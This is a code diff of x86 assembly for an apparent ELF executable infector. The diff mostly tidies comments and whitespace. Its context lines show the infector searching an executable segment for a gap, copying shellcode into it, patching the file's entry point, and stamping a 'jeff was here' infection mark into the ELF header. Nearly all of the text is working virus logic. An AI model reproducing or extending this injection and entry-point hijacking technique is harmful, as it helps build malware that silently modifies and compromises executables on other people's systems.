@@ -401,15 +401,12 @@ no_segment:
 
 segment_found:
 	; now that we found the target segment, we have to find a suitable gap to store our shellcode
-	;; arguments for find_gap
 	; segment offset in file
 	mov edx, [ebx + p_offset]
 	add edx, eax	; eax is the memory base of the file
 	push edx	; segment offset in memorry
 
-	push dword[ebx + p_filesz]	; segment size 	; TODO : might add some checks for weird errors like
-							; section has a size of 0 and and number of segements
-							; and sections exceeds 0xffff
+	push dword[ebx + p_filesz]
 	push dword[shellcode_size]
 
 	call find_gap
@@ -419,8 +416,6 @@ segment_found:
 	jmp clean
 
 next4:
-	; TODO : eax has the gap offset in memorry, store it somehwere or do whatever you wanna do with it!
-
 	; copying the shellcode
 	push eax ; the gap address
 	push dword[shellcode]
@@ -435,7 +430,7 @@ next4:
 	; 	4 - ???
 	; 	5 - profit
 
-	;; 1 - patch entry point
+	;; patching the entry point
 	; eax has the gap offset in memorry, we have to get the gap offset in file, then add it to the old 
 	; entry point
 	; ebx should still have a Elf32_Phdr pointer to the executable segment and
@@ -451,12 +446,12 @@ next4:
 leaving_mark:
 	push marking
 	push marking_len
-	call print ;"leaving mark ..."
+	call print	;"leaving mark ..."
 	;
 	mov eax, [pivot_data]
-	add eax, 9 ; pointing at EI_PAD
+	add eax, 9	; pointing at EI_PAD
 	push eax
-	push mark ; the "jeff was here" thingy
+	push mark	; the "jeff was here" thingy
 	call strlen
 	push eax
 	call copy_data
@@ -594,7 +589,7 @@ copying_loop:
 copied:
 	push shell_copied
 	push shell_copied_len
-	call print ; "shell copied!"
+	call print	; "shell copied!"
 	;restoring registers
 	add esp, 8
 	pop edx
@@ -651,7 +646,7 @@ no_gap:
 	push no_gap_found
 	push no_gap_found_len
 	call print
-	xor eax, eax ; gap = NULL
+	xor eax, eax		; gap = NULL
 	add esp, 8
 	jmp ret_gap
 
@@ -969,9 +964,6 @@ is_target_elf: 	; int is_target_elf(void *data)
 	jmp ret_arch
 
 good_elf_ptr:
-;	push good_elf
-;	push good_elf_len
-;	call print ; "file is indeed an elf"
 	; checking e_ident[ELFCLASS] ; eax still has the pointer to the mapped data
 	add eax, 4
 	cmp byte[eax], ELFCLASS32
